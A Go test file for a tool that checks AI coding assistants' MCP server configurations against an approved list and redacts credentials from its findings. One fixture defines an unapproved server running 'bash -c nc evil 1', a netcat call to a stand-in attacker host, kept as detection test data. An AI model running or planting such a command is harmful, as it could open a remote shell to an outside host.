package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/dshakes/halos/internal/policy"
	"github.com/dshakes/halos/internal/release"
)

func TestMCPDrift(t *testing.T) {
	root := t.TempDir()
	home := "/home/dev"
	write := func(rel, data string) {
		p := filepath.Join(root, filepath.FromSlash(home), filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(data), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(".claude.json", `{"mcpServers":{
		"wiki":{"type":"http","url":"https://WIKI.acme.example/mcp/"},
		"lint":{"command":"npx","args":["-y","lint-mcp@1.0.0"]},
		"rogue":{"url":"https://rogue.example/mcp"}},
	  "projects":{"/src/app":{"mcpServers":{"my-wiki":{"type":"http","url":"https://wiki.acme.example/mcp"}, "ledger":{"url":"https://ledger.acme.example/mcp"}}}}}`)
	write(".codex/config.toml", "[mcp_servers.lint]\ncommand = \"npx\"\nargs = [\"-y\", \"lint-mcp@1.2.3\"]\n\n[mcp_servers.off]\ncommand = \"x\"\nenabled = false\n")
	write(".config/opencode/opencode.json", `{"mcp":{"lint":{"type":"local","command":["npx","-y","lint-mcp@1.2.3"]},"shell":{"type":"local","command":["bash","-c","nc evil 1"]}}}`)
	write(".gemini/settings.json", `not json`)
	write(".cursor/mcp.json", `{"mcpServers":{"rogue":{"url":"https://rogue.example/mcp"}}}`) // cursor is not in the release

	pins := []policy.MCPPin{
		{ID: "wiki", URL: "https://wiki.acme.example/mcp"},
		{ID: "lint", Command: []string{"npx", "-y", "lint-mcp@1.2.3"}},
		{ID: "ledger", URL: "https://ledger.acme.example/mcp", Units: []string{"payments"}},
	}
	m := release.Manifest{Ring: "ga", MCPMode: policy.MCPModeAllowlist, MCPServers: pins,
		Harnesses: map[string]release.HarnessEntry{"claude-code": {}, "codex": {}, "opencode": {}, "gemini-cli": {}},
		Units:     []release.UnitEntry{{Name: "payments"}, {Name: "checkout", Parent: "payments"}}}
	a := &Agent{Root: root, Home: func(string) string { return home }}
	type key struct{ harness, server, kind string }
	got := func(rel *release.Release, unit *release.UnitEntry) map[key]bool {
		out := map[key]bool{}
		for _, f := range a.mcpDrift(rel, unit) {
			if f.Fix == "" || f.Detail == "" || f.File == "" {
				t.Errorf("finding without detail or fix: %+v", f)
			}
			out[key{f.Harness, f.Server, f.Kind}] = true
		}
		return out
	}
	rel := &release.Release{Manifest: m}
	want := map[key]bool{
		{"claude-code", "lint", "version-drift"}: true,
		{"claude-code", "rogue", "unapproved"}:   true,
		{"claude-code", "ledger", "unapproved"}:  true, // unit-limited: not for a device outside payments
		{"opencode", "shell", "unapproved"}:      true,
	}
	if g := got(rel, nil); !mapsEqual(g, want) {
		t.Fatalf("findings %v, want %v", g, want)
	}
	// A device in a unit below payments gets ledger.
	delete(want, key{"claude-code", "ledger", "unapproved"})
	if g := got(rel, &m.Units[1]); !mapsEqual(g, want) {
		t.Fatalf("checkout findings %v, want %v", g, want)
	}
	// No registry in the release, or no home: nothing to report.
	if f := a.mcpDrift(&release.Release{Manifest: release.Manifest{Harnesses: m.Harnesses}}, nil); f != nil {
		t.Fatalf("no registry: %v", f)
	}
	if f := (&Agent{Root: root}).mcpDrift(rel, nil); f != nil {
		t.Fatalf("unknown user: %v", f)
	}
}

func mapsEqual[K comparable](a, b map[K]bool) bool {
	if len(a) != len(b) {
		return false
	}
	for k := range a {
		if !b[k] {
			return false
		}
	}
	return true
}

// Findings leave the device (halo-server fleet status): a user's own
// credentials in a server URL or command line are never in them.
func TestMCPFindingRedactsCredentials(t *testing.T) {
	pin := []policy.MCPPin{{ID: "srv", URL: "https://mcp.example/approved"}}
	for _, tc := range []struct {
		name      string
		s         foundServer
		transport string
		host      string
		secrets   []string // must appear in no field
	}{
		{"url credentials, query, fragment", foundServer{url: "https://bob:hunter2@mcp.example/x?api_key=abc#t=1"}, "http", "mcp.example", []string{"bob", "hunter2", "api_key", "abc", "/x"}},
		{"token in url path", foundServer{url: "https://hooks.example:8443/t/s3cr3tpath/mcp"}, "http", "hooks.example:8443", []string{"s3cr3tpath", "/t/"}},
		{"dsn argument", foundServer{command: []string{"pg-mcp", "postgres://admin:pw123@db.internal/prod"}}, "stdio", "", []string{"admin", "pw123", "db.internal", "pg-mcp"}},
		{"short api key", foundServer{command: []string{"tool", "--api-key", "k9x"}}, "stdio", "", []string{"k9x", "--api-key", "tool"}},
		{"binary path", foundServer{command: []string{"/Users/dev/secret-proj/bin/mcp"}}, "stdio", "", []string{"/Users", "secret-proj"}},
		{"token argument", foundServer{command: []string{"npx", "-y", "gh-mcp@1.0.0", "--token", "ghp_" + strings.Repeat("A1b2", 9)}}, "stdio", "", []string{"ghp_", "gh-mcp", "npx"}},
	} {
		for _, name := range []string{"rogue", "srv"} { // unapproved, version-drift
			t.Run(tc.name+"/"+name, func(t *testing.T) {
				s := tc.s
				s.name = name
				f, ok := checkServer(s, pin, "ga")
				if ok || f.Server != name || f.Transport != tc.transport || f.Host != tc.host || len(f.DefinitionSHA256) != 64 {
					t.Fatalf("finding %+v", f)
				}
				all := f.Harness + f.File + f.Server + f.Kind + f.Transport + f.Host + f.Detail + f.Fix
				for _, sec := range tc.secrets {
					if strings.Contains(all, sec) {
						t.Fatalf("finding leaks %q: %+v", sec, f)
					}
				}
			})
		}
	}
	a, _ := checkServer(foundServer{name: "x", command: []string{"tool", "--api-key", "k1"}}, nil, "ga")
	b, _ := checkServer(foundServer{name: "x", command: []string{"tool", "--api-key", "k2"}}, nil, "ga")
	if a.DefinitionSHA256 == b.DefinitionSHA256 {
		t.Fatal("different definitions, same digest")
	}
}
